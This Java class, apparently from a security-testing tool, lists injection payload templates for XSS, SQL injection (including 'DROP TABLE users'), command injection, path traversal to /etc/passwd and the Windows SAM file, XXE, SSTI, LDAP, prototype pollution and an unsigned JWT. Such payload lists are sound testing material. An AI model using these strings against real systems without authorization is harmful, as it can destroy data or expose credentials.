import java.nio.charset.StandardCharsets;
import java.util.LinkedHashMap;
import java.util.Map;

/**
 * Common payload templates for security testing.
 */
public final class PayloadTranscoderTemplates {

    private PayloadTranscoderTemplates() {}

    public static Map<String, byte[]> getTemplates() {
        Map<String, byte[]> m = new LinkedHashMap<>();
        // XSS
        m.put("XSS: <script>alert(1)</script>", "<script>alert(1)</script>".getBytes(StandardCharsets.UTF_8));
        m.put("XSS: <img src=x onerror=alert(1)>", "<img src=x onerror=alert(1)>".getBytes(StandardCharsets.UTF_8));
        m.put("XSS: \"-alert(1)-\"", "\"-alert(1)-\"".getBytes(StandardCharsets.UTF_8));
        // SQLi
        m.put("SQLi: ' OR '1'='1", "' OR '1'='1".getBytes(StandardCharsets.UTF_8));
        m.put("SQLi: 1' UNION SELECT NULL--", "1' UNION SELECT NULL--".getBytes(StandardCharsets.UTF_8));
        m.put("SQLi: 1; DROP TABLE users--", "1; DROP TABLE users--".getBytes(StandardCharsets.UTF_8));
        // Command injection
        m.put("Cmd: ; id", "; id".getBytes(StandardCharsets.UTF_8));
        m.put("Cmd: | whoami", "| whoami".getBytes(StandardCharsets.UTF_8));
        m.put("Cmd: `id`", "`id`".getBytes(StandardCharsets.UTF_8));
        m.put("Cmd: $(id)", "$(id)".getBytes(StandardCharsets.UTF_8));
        // Path traversal
        m.put("Path: ../../../etc/passwd", "../../../etc/passwd".getBytes(StandardCharsets.UTF_8));
        m.put("Path: ..\\..\\..\\windows\\system32\\config\\sam", "..\\..\\..\\windows\\system32\\config\\sam".getBytes(StandardCharsets.UTF_8));
        // SSTI
        m.put("SSTI: {{7*7}}", "{{7*7}}".getBytes(StandardCharsets.UTF_8));
        m.put("SSTI: ${7*7}", "${7*7}".getBytes(StandardCharsets.UTF_8));
        m.put("SSTI: <%= 7*7 %>", "<%= 7*7 %>".getBytes(StandardCharsets.UTF_8));
        // LDAP
        m.put("LDAP: *)(uid=*))(|(uid=*", "*)(uid=*))(|(uid=*".getBytes(StandardCharsets.UTF_8));
        // XXE
        m.put("XXE: <!ENTITY xxe SYSTEM \"file:///etc/passwd\">", "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">".getBytes(StandardCharsets.UTF_8));
        // Prototype pollution
        m.put("Proto: {\"__proto__\":{\"polluted\":true}}", "{\"__proto__\":{\"polluted\":true}}".getBytes(StandardCharsets.UTF_8));
        // JWT
        m.put("JWT: none alg", "{\"alg\":\"none\",\"typ\":\"JWT\"}.{\"sub\":\"user\"}.".getBytes(StandardCharsets.UTF_8));
        return m;
    }
}
